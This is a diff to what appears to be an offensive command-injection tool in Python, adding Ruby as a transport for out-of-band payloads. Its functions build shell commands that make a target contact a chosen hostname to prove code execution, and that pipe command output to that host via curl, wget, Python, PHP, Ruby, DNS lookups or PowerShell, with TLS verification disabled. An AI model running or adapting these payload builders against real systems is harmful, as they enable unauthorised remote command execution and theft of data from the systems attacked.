@@ -36,12 +36,12 @@ PLUS = "+"
 """
 The HTTP clients used to reach the out-of-band server, most common first.
 """
-UNIX_TRANSPORTS = ["curl", "wget", "python", "dns", "php"]
+UNIX_TRANSPORTS = ["curl", "wget", "python", "dns", "php", "ruby"]
 # Clients worth asking for, but not on every boundary of the sweep: each one there costs a request
 # per boundary, and a target either has a client or it does not - which is not a thing a boundary
 # changes. They are asked once a boundary is confirmed, where a target without the common ones still
 # needs something that carries output back whole rather than a name at a time.
-FALLBACK_TRANSPORTS = ("php",)
+FALLBACK_TRANSPORTS = ("php", "ruby")
 # 'curl.exe' leads on Windows, where it has shipped in System32 since Windows 10 1803: unlike a
 # name lookup it carries command output back, and it is quick to give up where a host has no way
 # out. A lookup follows, present on every Windows and the one confirmed against a real target.
@@ -101,6 +101,20 @@ def _php_prog(hostname, from_stdin=False, proof=""):
   return "php -r \"file_get_contents('" + _url(hostname, proof) + "'" + context + ");\""
 
 """
+Build the Ruby program a payload runs, reading its body from stdin when a command is being sent.
+
+'net/http' speaks TLS itself, so this reaches an HTTPS server without a client in front of it. The
+certificate is not checked, for the same reason it is not checked anywhere else here: the target
+rarely has a store to check it against, and failing on that would cost the whole transport.
+"""
+def _ruby_prog(hostname, from_stdin=False, proof=""):
+  url = _url(hostname, proof)
+  verb = "post(u.request_uri,STDIN.read)" if from_stdin else "get(u.request_uri)"
+  # The program is inside double quotes, so the shell still does the sum before Ruby sees the URL.
+  return ("ruby -rnet/http -ropenssl -e \"u=URI('" + url + "');h=Net::HTTP.new(u.host,u.port);"
+          "h.use_ssl=(u.scheme=='https');h.verify_mode=OpenSSL::SSL::VERIFY_NONE;h." + verb + "\"")
+
+"""
 Build the command that makes the target contact a hostname, carrying a sum for it to evaluate.
 """
 def reach_command(transport, hostname, proof="", separator=OR):
@@ -112,6 +126,8 @@ def reach_command(transport, hostname, proof="", separator=OR):
     return _python_prog(hostname, proof=proof)
   if transport == "php":
     return _php_prog(hostname, proof=proof)
+  if transport == "ruby":
+    return _ruby_prog(hostname, proof=proof)
   if transport == "dns":
     # Resolving the name is enough to prove execution, and needs no HTTP client at all.
     return dns_lookup_command(hostname, separator)
@@ -204,7 +220,7 @@ def transport_of(payload):
   # that filler back out before looking for one.
   normalized = re.sub(r'""|\^|\\|\$@', "", payload)
   for transport, marker in (("python", "urllib.request"), ("php", "file_get_contents"),
-                            ("dns", "nslookup"), ("curl", "curl"),
+                            ("ruby", "VERIFY_NONE"), ("dns", "nslookup"), ("curl", "curl"),
                             ("wget", "wget"), ("powershell", "powershell")):
     if marker in normalized:
       return transport
@@ -300,7 +316,7 @@ def heuristic_payload(channel, target_os):
 Report whether a transport can carry a computation the receiving end can check.
 """
 def supports_proof(transport):
-  return transport in ("curl", "wget", "python", "powershell", "php")
+  return transport in ("curl", "wget", "python", "powershell", "php", "ruby")
 
 """
 Build a sum for the target to evaluate, returned as (expression, expected result, prologue). The
@@ -354,7 +370,7 @@ def proof(transport, plus=PLUS):
 Report whether a transport can carry command output back.
 """
 def supports_exfiltration(transport):
-  return transport in ("curl", "wget", "python", "powershell", "dns", "php")
+  return transport in ("curl", "wget", "python", "powershell", "dns", "php", "ruby")
 
 """
 Hex characters per label, so a name stays inside the 253 bytes a DNS query has for it. Even, so a
@@ -442,6 +458,8 @@ def exfil_command(transport, hostname, cmd, pipe=PIPE, separator=""):
     return grouped + pipe + _python_prog(hostname, from_stdin=True)
   if transport == "php":
     return grouped + pipe + _php_prog(hostname, from_stdin=True)
+  if transport == "ruby":
+    return grouped + pipe + _ruby_prog(hostname, from_stdin=True)
   if transport == "powershell":
     # Out-String joins the lines into one body.
     return ("powershell.exe -c iwr -Uri " + _url(hostname) + " -Method POST -Body "
